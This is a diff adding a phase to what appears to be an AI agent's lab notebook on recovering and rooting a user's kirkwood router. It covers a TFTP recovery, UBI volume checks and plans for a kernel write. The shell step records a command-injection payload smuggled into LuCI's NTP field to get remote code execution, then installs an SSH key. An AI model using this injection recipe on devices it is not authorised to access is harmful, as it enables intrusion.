@@ -13138,3 +13138,72 @@ It is now an argument about the bytes: the md5 of the payload equals the md5 of 
 **Recorded because this is the check that would have caught a wrong-tree build** - the same confusion
 that produced the false "no luofu symbols" negative in PHASE 134 came from there being TWO trees, and
 the only thing that distinguished them was matching a size. Matching the md5 is the strong form.
+
+
+# ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
+# PHASE 136 (2026-10-12): ★★★★★ THE RESET WORKED, THE SHELL IS BACK, AND THE ROOTFS SURVIVED AND MOUNTS ★★★★★
+# ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
+
+## THE COLD RESET AND THE DOOR
+
+The user performed the cold reset-hold. The TFTP door served the bootrom:
+
+    RRQ recovery.bin from ('192.168.1.1', 1150)
+    DONE 40969 blocks 20975775 bytes in 4.0s
+
+The board came back on **192.168.10.1 at 65 s**: web UI up (80/443), ssh down - the expected
+post-recovery shape.
+
+## THE SHELL, RE-LAID FIRST TRY (the PHASE 109 recipe, applied)
+
+    login   : GET /cgi-bin/luci/admin/wizard -> 403 + the form (NORMAL), salt 222f6c90...
+              sha256(sha256(pw+salt)) since this build serves no `token` at login
+              POST -> 302 + Set-Cookie: sysauth=e4e250c536...   (persistent jar)
+    RCE     : GET /system/systime serves the REQUIRED `token`
+              POST cbid.system.ntp.current="'; <b64 cmd>; #" + cbi.submit=1
+              **PROVEN BY SIDE EFFECT**: the command wrote /www/luci-static/rmark*.txt
+              and a plain GET of it returned 200
+    dropbear: both host keys regenerated (they ship 0 bytes), the project key installed to BOTH
+              /root/.ssh/authorized_keys and /etc/dropbear/authorized_keys (0600), then
+              /sbin/start-stop-daemon -S -x /usr/sbin/dropbear -- -p 22 -R
+              -> `netstat` on the device shows 0.0.0.0:22 LISTEN; port 22 answers
+    ssh     : key login works - "SSH-OK", rev 2.4.15, boot_reg 10, ubi0 on mtd13
+
+## ★★★★★ STEP 3: THE `owrt` VOLUME SURVIVED AND MOUNTS - STEP 4 IS UNNECESSARY ★★★★★
+
+    grep upgrade /proc/mtd   -> mtd16: 01d80000 00020000 "upgrade"
+    ubiattach -m 16 -d 1     -> UBI device number 1, total 236 LEBs, **available 79 LEBs (9.5 MiB)**
+
+    ubinfo -d 1 -N owrt:
+        Volume ID:   0 (on ubi1)
+        Type:        **dynamic**
+        Size:        133 LEBs (16,887,808 bytes, 16.1 MiB)
+        State:       **OK**
+        Name:        **owrt**
+
+    ubiblock --create /dev/ubi1_0 ; mount -t squashfs -o ro /dev/ubiblock1_0 /mnt/u
+        -> **MOUNT-OK**
+
+    contents: bin dev etc lib mnt overlay proc rom root sbin sys tmp usr var www
+              DISTRIB_RELEASE='25.12.5'  DISTRIB_REVISION='r33051-f5dae5ece4'
+              DISTRIB_TARGET='kirkwood/generic'  DISTRIB_ARCH='arm_xscale'
+              /mnt/u/etc/init.d/dropbear  PRESENT   (ssh comes up on our kernel)
+              /mnt/u/sbin/init            PRESENT
+
+**Every prediction of the plan held:** the volume survived the recovery AND this one (it has now been
+through at least two recovery flashes), it is dynamic as measured before, it is State OK, and it mounts
+through ubiblock exactly as `ubi.block=0,0` requires.
+
+## THE PATH IS NOW SHORT
+
+    SKIP step 4 (no rootfs work - the volume is there and mounts)
+    NEXT : write build/tmp/slice/r4fix-slot.bin into kernela, set the selectors, reboot, read C18
+    PREDICT: C18 = 0xC0DE502D  AND  the box STAYS REACHABLE (dropbear in the rootfs)
+
+## A SAFETY NOTE BEFORE THE WRITE
+
+**Both slots currently hold the STOCK kernel** (`ba868bd449631964525fd620b5480646`, identical on mtd11
+and mtd12) - the recovery re-flashed them, overwriting the previous r4fix image. So `mtd11` is a clean
+vendor kernel right now, and I have a hash-verified copy of it
+(`build/tmp/fire3/kernela-backup.bin` is the PREVIOUS content; the CURRENT one should be re-backed-up
+before overwriting, so the rollback matches what is actually on the device).
